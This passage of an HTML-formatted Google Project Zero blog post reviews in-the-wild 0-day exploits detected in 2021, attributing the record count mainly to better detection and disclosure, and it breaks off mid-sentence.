"}ol.lst-kix_qhs0t3wlsx02-5{list-style-type:none}ol.lst-kix_qhs0t3wlsx02-4{list-style-type:none}ol.lst-kix_qhs0t3wlsx02-4.start{counter-reset:lst-ctn-kix_qhs0t3wlsx02-4 0}ol.lst-kix_czzguda5pqu4-3.start{counter-reset:lst-ctn-kix_czzguda5pqu4-3 0}.lst-kix_rwsfzn4jdl6v-0&gt;li:before{content:"\0025cf  "}.lst-kix_czzguda5pqu4-8&gt;li:before{content:"" counter(lst-ctn-kix_czzguda5pqu4-8,lower-roman) ". "}.lst-kix_qhs0t3wlsx02-0&gt;li{counter-increment:lst-ctn-kix_qhs0t3wlsx02-0}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}.lst-kix_czzguda5pqu4-6&gt;li:before{content:"" counter(lst-ctn-kix_czzguda5pqu4-6,decimal) ". "}.lst-kix_knibgsincpme-0&gt;li:before{content:"\0025cf  "}.lst-kix_czzguda5pqu4-0&gt;li:before{content:"" counter(lst-ctn-kix_czzguda5pqu4-0,decimal) ". "}.lst-kix_czzguda5pqu4-4&gt;li:before{content:"" counter(lst-ctn-kix_czzguda5pqu4-4,lower-latin) ". "}.lst-kix_knibgsincpme-2&gt;li:before{content:"\0025a0  "}.lst-kix_h2vtkcla8l9d-5&gt;li{counter-increment:lst-ctn-kix_h2vtkcla8l9d-5}.lst-kix_qhs0t3wlsx02-6&gt;li{counter-increment:lst-ctn-kix_qhs0t3wlsx02-6}.lst-kix_czzguda5pqu4-3&gt;li{counter-increment:lst-ctn-kix_czzguda5pqu4-3}.lst-kix_czzguda5pqu4-2&gt;li:before{content:"" counter(lst-ctn-kix_czzguda5pqu4-2,lower-roman) ". "}ol{margin:0;padding:0}table td,table th{padding:0}.HNYIspzEBn-c4{margin-left:36pt;padding-top:0pt;padding-left:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.HNYIspzEBn-c11{padding-top:20pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.HNYIspzEBn-c13{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:20pt;font-family:"Arial";font-style:normal}.HNYIspzEBn-c16{color:#666666;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:15pt;font-family:"Arial";font-style:normal}.HNYIspzEBn-c8{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:italic}.HNYIspzEBn-c7{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.HNYIspzEBn-c2{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:11pt}.HNYIspzEBn-c12{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:16pt;font-family:"Arial";font-style:normal}.HNYIspzEBn-c0{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.HNYIspzEBn-c18{padding-top:0pt;padding-bottom:16pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.HNYIspzEBn-c5{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.HNYIspzEBn-c1{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.HNYIspzEBn-c10{font-family:Consolas,"Courier New";color:#0d904f;font-weight:400}.HNYIspzEBn-c19{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.HNYIspzEBn-c3{color:inherit;text-decoration:inherit}.HNYIspzEBn-c6{padding:0;margin:0}.HNYIspzEBn-c9{font-weight:700;font-style:italic}.HNYIspzEBn-c17{font-weight:700}.HNYIspzEBn-c14{font-style:italic}.HNYIspzEBn-c15{margin-left:36pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class="HNYIspzEBn-c19"&gt; &lt;p class="c18 subtitle" id="h.bcdrmuya7iqp"&gt;&lt;span class="HNYIspzEBn-c16"&gt;A Year in Review of 0-days Used In-the-Wild in 2021&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span class="HNYIspzEBn-c0"&gt;Posted by Maddie Stone, Google Project Zero&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;This is our third annual year in review of 0-days exploited in-the-wild [&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.blogspot.com/2021/02/deja-vu-lnerability.html"&gt;2020&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.blogspot.com/2020/07/detection-deficit-year-in-review-of-0.html"&gt;2019&lt;/a&gt;&lt;/span&gt;&lt;span&gt;]. Each year we&amp;rsquo;ve looked back at all of the detected and disclosed in-the-wild 0-days as a group and synthesized what we think the trends and takeaways are. The goal of this report is not to detail each individual exploit, but instead to analyze the exploits from the year as a group, looking for trends, gaps, lessons learned, successes, etc. If you&amp;rsquo;re interested in the analysis of individual exploits, please check out our &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.blogspot.com/p/rca.html"&gt;root cause analysis repository&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;We perform and share this analysis in order to &lt;/span&gt;&lt;span class="HNYIspzEBn-c17"&gt;make 0-day hard&lt;/span&gt;&lt;span&gt;. We want it to be more costly, more resource intensive, and overall more difficult for attackers to use 0-day capabilities. 2021 highlighted just how important it is to stay relentless in our pursuit to make it harder for attackers to exploit users with 0-days. We heard &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://forbiddenstories.org/about-the-pegasus-project/"&gt;over&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://citizenlab.ca/2021/07/hooking-candiru-another-mercenary-spyware-vendor-comes-into-focus/"&gt;over&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://www.amnesty.org/en/latest/research/2021/11/devices-of-palestinian-human-rights-defenders-hacked-with-nso-groups-pegasus-spyware-2/"&gt;over&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;&amp;nbsp;about how governments were targeting journalists, minoritized populations, politicians, human rights defenders, and even security researchers around the world. The decisions we make in the security and tech communities can have real impacts on society and our fellow humans&amp;rsquo; lives.&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;We&amp;rsquo;ll provide our evidence and process for our conclusions in the body of this post, and then wrap it all up with our thoughts on next steps and hopes for 2022 in the conclusion. If digging into the bits and bytes is not your thing, then feel free to just check-out the Executive Summary and Conclusion.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="HNYIspzEBn-c11" id="h.tf3r1j8la9a4"&gt;&lt;span class="HNYIspzEBn-c13"&gt;Executive Summary&lt;/span&gt;&lt;/h1&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;2021 included the detection and disclosure of &lt;/span&gt;&lt;span&gt;58&lt;/span&gt;&lt;span&gt;&amp;nbsp;in-the-wild 0-days, the most ever recorded since Project Zero began tracking in mid-2014. That&amp;rsquo;s more than double the previous maximum of 28 detected in 2015 and especially stark when you consider that there were only 25 detected in 2020. We&amp;rsquo;ve tracked publicly known in-the-wild 0-day exploits in &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=0"&gt;this spreadsheet&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;&amp;nbsp;since mid-2014.&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;While we often talk about the number of 0-day exploits &lt;/span&gt;&lt;span class="HNYIspzEBn-c9"&gt;used&lt;/span&gt;&lt;span&gt;&amp;nbsp;in-the-wild, what we&amp;rsquo;re actually discussing is the number of 0-day exploits &lt;/span&gt;&lt;span class="HNYIspzEBn-c9"&gt;detected and disclosed&lt;/span&gt;&lt;span class="HNYIspzEBn-c14"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;as in-the-wild. And that leads into our first conclusion: we believe the large uptick in in-the-wild 0-days in 2021 is due to increased detection and disclosure of these 0-days, rather than simply increased usage of 0-day exploits.&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;With this record number of in-the-wild 0-days to analyze we saw that attacker methodology hasn&amp;rsquo;t actually had to change much from previous years&lt;/span&gt;&lt;span&gt;. Attackers are having success using the same bug patterns and exploitation techniques and going after the same attack surfaces. Project Zero&amp;rsquo;s mission is &amp;ldquo;make 0day hard&amp;rdquo;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;0-day will be harder when, overall, attackers are not able to use public methods and techniques for developing their 0-day exploits. When we look over these 58 0-days used in 2021, what we see instead are 0-days that are similar to previous &amp;amp; publicly known vulnerabilities. Only two 0-days stood out as novel: one for the technical sophistication of its exploit and the other for its use of logic bugs to escape the sandbox.&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;So while we recognize the industry&amp;rsquo;s improvement in the detection and disclosure of in-the-wild 0-days, we also acknowledge that there&amp;rsquo;s a lot more improving to be done.&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;&amp;nbsp;Having access to more &amp;ldquo;ground truth&amp;rdquo; of how attackers are actually using 0-days shows us that they are able to have success by using previously known techniques and methods rather than having to invest in developing novel techniques. This is a clear area of opportunity for the tech industry.&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;We had so many more data points in 2021 to learn about attacker behavior than we&amp;rsquo;ve had in the past. Having all this data, though, has left us with even more questions than we had before. &lt;/span&gt;&lt;span&gt;Unfortunately, attackers who actively use 0-day exploits do not share the 0-days they&amp;rsquo;re using or what percentage of 0-days we&amp;rsquo;re missing in our tracking, so we&amp;rsquo;ll never know exactly what proportion of 0-days are currently being found and disclosed publi&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;cly. &lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span class="HNYIspzEBn-c0"&gt;Based on our analysis of the 2021 0-days we hope to see the following progress in 2022 in order to continue taking steps towards making 0-day hard:&lt;/span&gt;&lt;/p&gt;&lt;ol class="c6 lst-kix_jdourvkzhmg1-0 start" start="1"&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="HNYIspzEBn-c0"&gt;All vendors agree to disclose the in-the-wild exploitation status of vulnerabilities in their security bulletins.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="HNYIspzEBn-c0"&gt;Exploit samples or detailed technical descriptions of the exploits are shared more widely.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="HNYIspzEBn-c0"&gt;Continued concerted efforts on reducing memory corruption vulnerabilities or rendering them unexploitable.Launch mitigations that will significantly impact the exploitability of memory corruption vulnerabilities.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h1 class="HNYIspzEBn-c11" id="h.ka5ptbumk5o1"&gt;&lt;span class="HNYIspzEBn-c13"&gt;A Record Year for In-the-Wild 0-days&lt;/span&gt;&lt;/h1&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span class="HNYIspzEBn-c0"&gt;2021 was a record year for in-the-wild 0-days. So what happened?&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiM4gCoxLJVRGTOOAa0G44m0K7JF0hFFDI02iBV7REJruq3uiZof8wNylU1aNxOte2oEhhj_5JM9tS0VOwgA-eiKIaQ_DdmTQtlC9OUKSRA6kes4_d_-BKyeZsJ2bxISU2HJmZRG-_kVtKguVM8-eo7mbHl1_zs8DUGnY5mD-BiWYz6ayl472_aq7G_wQ/s1200/image1.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiM4gCoxLJVRGTOOAa0G44m0K7JF0hFFDI02iBV7REJruq3uiZof8wNylU1aNxOte2oEhhj_5JM9tS0VOwgA-eiKIaQ_DdmTQtlC9OUKSRA6kes4_d_-BKyeZsJ2bxISU2HJmZRG-_kVtKguVM8-eo7mbHl1_zs8DUGnY5mD-BiWYz6ayl472_aq7G_wQ/s600/image1.png" border="0" alt="bar graph showing the number of in-the-wild 0-day detected per year from 2015-2021. The totals are taken from this tracking spreadsheet: https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=2129022708" style="max-height: 750; max-width: 600;"title="bar graph showing the number of in-the-wild 0-day detected per year from 2015-2021. The totals are taken from this tracking spreadsheet: https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=2129022708" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span class="HNYIspzEBn-c0"&gt;Is it that software security is getting worse? Or is it that attackers are using 0-day exploits more? Or has our ability to detect and disclose 0-days increased? When looking at the significant uptick from 2020 to 2021, we think it&amp;#39;s mostly explained by the latter. While we believe there has been a steady growth in interest and investment in 0-day exploits by attackers in the past several years, and that security still needs to urgently improve, it appears that the security industry&amp;#39;s ability to detect and disclose in-the-wild 0-day exploits is the primary explanation for the increase in observed 0-day exploits in 2021.&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;While we often talk about &amp;ldquo;0-day exploits &lt;/span&gt;&lt;span class="HNYIspzEBn-c9"&gt;used &lt;/span&gt;&lt;span&gt;in-the-wild&amp;rdquo;, what we&amp;rsquo;re actually tracking are &amp;ldquo;0-day exploits &lt;/span&gt;&lt;span class="HNYIspzEBn-c9"&gt;detected and disclosed&lt;/span&gt;&lt;span&gt;&amp;nbsp;as used in-the-wild&amp;rdquo;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;There are more factors than just the &lt;/span&gt;&lt;span class="HNYIspzEBn-c9"&gt;use&lt;/span&gt;&lt;span class="HNYIspzEBn-c14"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;that contribute to an increase in that number, most notably: detection and disclosure. Better detection of 0-day exploits and more transparently disclosed exploited 0-day vulnerabilities is a positive indicator for security and progress in the industry. &lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span class="HNYIspzEBn-c0"&gt;Overall, we can break down the uptick in the number of in-the-wild 0-days into:&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c6 lst-kix_rwsfzn4jdl6v-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="HNYIspzEBn-c0"&gt;More detection of in-the-wild 0-day exploits&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="HNYIspzEBn-c0"&gt;More public disclosure of in-the-wild 0-day exploitation&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 class="HNYIspzEBn-c7" id="h.irhic7h0695k"&gt;&lt;span class="HNYIspzEBn-c12"&gt;More detection&lt;/span&gt;&lt;/h2&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;In the &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.blogspot.com/2020/07/detection-deficit-year-in-review-of-0.html"&gt;2019 Year in Review&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, we wrote about the &amp;ldquo;Detection Deficit&amp;rdquo;. We stated &amp;ldquo;&lt;/span&gt;&lt;span class="HNYIspzEBn-c17"&gt;As a community, our ability to detect 0-days being used in the wild is severely lacking to the point that we can&amp;rsquo;t draw significant conclusions due to the lack of (and biases in) the data we have collected&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;.&amp;rdquo; In the last two years, we believe that there&amp;rsquo;s been progress on this gap. &lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;Anecdotally, we hear from more people that they&amp;rsquo;ve begun working more on detection of 0-day exploits. Quantitatively, while a &lt;/span&gt;&lt;span class="HNYIspzEBn-c14"&gt;very&lt;/span&gt;&lt;span&gt;&amp;nbsp;rough measure, we&amp;rsquo;re also seeing the number of entities credited with reporting in-the-wild 0-days increasing. I&lt;/span&gt;&lt;span&gt;t stands to reason that if the number of people working on trying to find 0-day exploits increases, then the number of in-the-wild 0-day exploits detected may increase.&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEghbECEc5FM4UnpQnlj4bXY2ZhDWB0OHbbzaiCJzHPMH_RFJ_XjWa0zHisBvl1zsG09xc-8NvmRdP_3JzT51nge8njHQowYPiDJv8SGngwdj9jPQRfXuJjIJdAAKVvItpE9Zfay-04clFQTGMMA2Xs7kS129D5uLGTV8z8mysT-DdJ8MTSB12jXaCIwew/s1200/image5.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEghbECEc5FM4UnpQnlj4bXY2ZhDWB0OHbbzaiCJzHPMH_RFJ_XjWa0zHisBvl1zsG09xc-8NvmRdP_3JzT51nge8njHQowYPiDJv8SGngwdj9jPQRfXuJjIJdAAKVvItpE9Zfay-04clFQTGMMA2Xs7kS129D5uLGTV8z8mysT-DdJ8MTSB12jXaCIwew/s600/image5.png" border="0" alt="A bar graph showing the number of distinct reporters of 0-day in-the-wild vulnerabilities per year for 2019-2021. 2019: 9, 2020: 10, 2021: 20. The data is taken from: https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=2129022708" style="max-height: 750; max-width: 600;"title="A bar graph showing the number of distinct reporters of 0-day in-the-wild vulnerabilities per year for 2019-2021. 2019: 9, 2020: 10, 2021: 20. The data is taken from: https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=2129022708" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKGqdhr0uqme9Ta6_IeeH8rLnVORZwThzr_k9HBwWDEdCBAyIaH-Pbza-H6uF9n5-oLmi6LJ7_xA3yI4AkLAvXR2f7e69P3e7RUesU49NJC0wQO6btb8Jr2FCblvcaqmILn3cDItLoPQnaKOKDVVRFdBNtPTxcsug-213zyZC7RtPa3AhRTmOjeGbtgQ/s1200/image2.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKGqdhr0uqme9Ta6_IeeH8rLnVORZwThzr_k9HBwWDEdCBAyIaH-Pbza-H6uF9n5-oLmi6LJ7_xA3yI4AkLAvXR2f7e69P3e7RUesU49NJC0wQO6btb8Jr2FCblvcaqmILn3cDItLoPQnaKOKDVVRFdBNtPTxcsug-213zyZC7RtPa3AhRTmOjeGbtgQ/s600/image2.png" border="0" alt="a line graph showing how many in-the-wild 0-days were found by their own vendor per year from 2015 to 2021. 2015: 0, 2016: 0, 2017: 2, 2018: 0, 2019: 4, 2020: 5, 2021: 17. Data comes from: https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=2129022708" style="max-height: 750; max-width: 600;"title="a line graph showing how many in-the-wild 0-days were found by their own vendor per year from 2015 to 2021. 2015: 0, 2016: 0, 2017: 2, 2018: 0, 2019: 4, 2020: 5, 2021: 17. Data comes from: https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=2129022708" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;We&amp;rsquo;ve also seen the number of vendors detecting in-the-wild 0-days in their own products increasing.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Whether or not these vendors were previously working on detection, vendors seem to have found ways to be more successful in 2021. Vendors likely have the most telemetry and overall knowledge and visibility into their products so it&amp;rsquo;s important that they are investing in (and hopefully having success in) detecting 0-days targeting their own products. As shown in the &lt;/span&gt;&lt;span&gt;chart above&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;, there was a significant increase in the number of in-the-wild 0-days discovered by vendors in their own products. Google discovered 7 of the in-the-wild 0-days in their own products and Microsoft discovered 10 in their products!&lt;/span&gt;&lt;/p&gt;&lt;h2 class="HNYIspzEBn-c7" id="h.bkkzvkf2rtnk"&gt;&lt;span class="HNYIspzEBn-c12"&gt;More disclosure&lt;/span&gt;&lt;/h2&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;The second reason why the number of detected in-the-wild 0-days has increased is due to more disclosure of these vulnerabilities. Apple and Google Android &lt;/span&gt;&lt;span&gt;(we &lt;/span&gt;&lt;span&gt;differentiate&lt;/span&gt;&lt;span&gt;&amp;nbsp;&amp;ldquo;Google Android&amp;rdquo; rather than just &amp;ldquo;Google&amp;rdquo; because Google Chrome has been annotating their security bulletins for the last few years)&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;&amp;nbsp;first began labeling vulnerabilities in their security advisories with the information about potential in-the-wild exploitation in November 2020 and January 2021 respectively. When vendors don&amp;rsquo;t annotate their release notes, the only way we know that a 0-day was exploited in-the-wild is if the researcher who discovered the exploitation comes forward. If Apple and Google Android had not begun annotating their release notes, the public would likely not know about at least 7 of the Apple in-the-wild 0-days and 5 of the Android in-the-wild 0-days. Why? Because these vulnerabilities were reported by &amp;ldquo;Anonymous&amp;rdquo; reporters. If the reporters didn&amp;rsquo;t want credit for the vulnerability, it&amp;rsquo;s unlikely that they would have gone public to say that there were indications of exploitation. That is 12 0-days that wouldn&amp;rsquo;t have been included in this year&amp;rsquo;s list if Apple and Google Android had not begun transparently annotating their security advisories. &lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgmsfv3qdXGZszBVuvB72wozoL0eIwnbnzkCk-34BRZBF42BwEPSlJTZvr7ToosTWWZaGm6-5H0hLWsPVbpuFYVMKeXri8OWB2iIZsG2ZAfMz6q8c_EEXN7yllXpdFpW6l-TeEb_qpIVRRHJ2v9sIk-E54Y0ZX8WowkHS1dfRY-yVPs4J2PqGahA6d_WA/s1200/image3.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgmsfv3qdXGZszBVuvB72wozoL0eIwnbnzkCk-34BRZBF42BwEPSlJTZvr7ToosTWWZaGm6-5H0hLWsPVbpuFYVMKeXri8OWB2iIZsG2ZAfMz6q8c_EEXN7yllXpdFpW6l-TeEb_qpIVRRHJ2v9sIk-E54Y0ZX8WowkHS1dfRY-yVPs4J2PqGahA6d_WA/s600/image3.png" border="0" alt="bar graph that shows the number of Android and Apple (WebKit + iOS + macOS) in-the-wild 0-days per year. The bar graph is split into two color: yellow for Anonymously reported 0-days and green for non-anonymous reported 0-days. 2021 is the only year with any anonymously reported 0-days. 2015: 0, 2016: 3, 2018: 2, 2019: 1, 2020: 3, 2021: Non-Anonymous: 8, Anonymous- 12. Data from: https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=2129022708" style="max-height: 750; max-width: 600;"title="bar graph that shows the number of Android and Apple (WebKit + iOS + macOS) in-the-wild 0-days per year. The bar graph is split into two color: yellow for Anonymously reported 0-days and green for non-anonymous reported 0-days. 2021 is the only year with any anonymously reported 0-days. 2015: 0, 2016: 3, 2018: 2, 2019: 1, 2020: 3, 2021: Non-Anonymous: 8, Anonymous- 12. Data from: https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=2129022708" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;Kudos and thank you to 